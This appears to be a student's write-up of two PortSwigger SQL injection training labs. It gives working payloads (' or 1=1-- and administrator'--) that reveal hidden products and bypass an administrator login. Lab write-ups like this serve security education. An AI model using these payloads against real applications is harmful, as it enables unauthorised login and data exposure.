# SQL injection

# [**_1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data_**](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Lifestyle' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

```sql
SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1
```

payload:

```
' or 1=1--
```

# [**_2. Lab: SQL injection vulnerability allowing login bypass_**](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

plan:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '1234'
```

payload:

```
administrator'--
```
